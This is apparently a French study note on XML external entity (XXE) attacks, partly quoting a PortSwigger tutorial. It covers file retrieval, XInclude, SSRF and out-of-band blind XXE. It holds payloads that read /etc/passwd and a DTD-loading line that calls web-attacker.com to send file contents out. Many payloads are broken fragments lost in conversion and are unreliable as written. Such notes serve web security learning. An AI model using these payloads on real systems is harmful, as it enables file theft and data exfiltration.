**Fonctionnalité possible grâce aux XXE :**

Récupérer des fichiers :

On définit des externals entities contenant des fichiers puis on le reçoit avec la réponse de l'application.

Faire des [SSRF](evernote:///view/240045035/s396/adfa3887-142b-b144-62c3-f94da0de4d58/9fdda52f-c858-15a6-e4c5-a5747f596bad "evernote:///view/240045035/s396/adfa3887-142b-b144-62c3-f94da0de4d58/9fdda52f-c858-15a6-e4c5-a5747f596bad") attacks :

On récupère des données du système cible comme des fichiers par exemple.

Extraire des données en Out-of-Band grâce au Blind XXE :

On créer une requête xml qui demande au server d'envoyer la réponse à un endpoint qu'on controle.

Chopper des données via les messages d'erreur grâce au Blind XXE :

Tout est dans le nom.

---

**Exploitation :**

**Récupération de fichier :**

- **Basic exploit entity :**
    
    - Injection :
        
        - ]>
        - &xxe;
    - Bon c'est simple, on créer une entités "xxe" qui réfère au fichier /etc/passwd sur la cible. Puis on fait référence à celui-ci grâce à &xxe; ne pas oublier le ; après.
- **Xinclude attacks :**
    
    - Injection :
        
        - <xi:include parse="text" href="[file:///etc/passwd"/></foo>](file:///etc/passwd%22/%3E%3C/foo%3E "file:///etc/passwd%22/%3E%3C/foo%3E")
    - Pour comparer, faut voir xmlns comme un import en python. Le xi tu peux mettre n'importe quoi à la place c'est un peu comme une variable qui référence un lien.
    - Ensuite, sur la deuxième ligne, on définit un élément de xi grâce à xi:include. Cet élément a deux attributs, parse:"text" qui indique que le contenu de l'inclusion sera traité comme du texte. Et href="[file:///etc/passwd"](file:///etc/passwd%22 "file:///etc/passwd%22") c'est un fichier que l'attaquant veut inclure.
    - Conséquences :
        - Si le serveur XML est mal configuré, il pourrait peut-être nous renvoyer le contenu du fichier car en fait on fait référence au fichier donc le serveur pourrai comprendre qu'on veut voir le contenu.

**SSRF attacks with XXE :**

- **Basic exploit entity :**
    - Injection :
        
        - ]>
        - &xxe;
    - C'est simple, on défini une entité "xxe" qui réfère à l'url. Puis on fait référence à celui-ci grâce à &xxe;

**Blind XXE :**

[https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind "https://portswigger.net/web-security/xxe/blind")  
**Out-of-band blind XXE :**  
**  
**

- Configuration basique pour récupérer les données sur ton domaine (burp collaborator par ex) :
    - Exploiting blind XXE to exfiltrate data out-of-band
        
    
    - Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.
        
    
    - An example of a malicious DTD to exfiltrate the contents of the /etc/passwd file is as follows:
        
    
    - ">
    - %eval;
        
    - %exfiltrate;
        
    
    - This DTD carries out the following steps:
        
    
    - Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
        
    - Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
        
    - Uses the eval entity, which causes the dynamic declaration of the exfiltrate entity to be performed.
        
    - Uses the exfiltrate entity, so that its value is evaluated by requesting the specified URL.
        
    
    - The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:
        
    - [http://web-attacker.com/malicious.dtd](http://web-attacker.com/malicious.dtd "http://web-attacker.com/malicious.dtd")
        
    
    - Finally, the attacker must submit the following XXE payload to the vulnerable application:
        
    - DOCTYPE foo [<!ENTITY % xxe SYSTEM
    - "[http://web-attacker.com/malicious.dtd](http://web-attacker.com/malicious.dtd "http://web-attacker.com/malicious.dtd")"> %xxe;]>
        
    
    - This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the /etc/passwd file is transmitted to the attacker's server.
        
    - Note
        
    
    - This technique might not work with some file contents, including the newline characters contained in the /etc/passwd file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the FTP protocol instead of HTTP. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as /etc/hostname can be targeted instead.
        
- **Basic exploit entity :**
    - Injection :
        
        - ]>
        - &xxe;
    - C'est simple, faut juste controler un domaine (payant ou burpsuite collaborator payant aussi).
- **Basic exploit paramètre :**
    - Injection :
        - %xxe; ]>
    - Là on déclare un paramètre grâce à % suivi du nom du paramètre (xxe) qui réfère à un domaine qu'on controle. Ensuite, on l'appelle grâce à %xxe; donc ça va envoyer une requete HTTP au domaine controlé et on pourra exflitrer des données.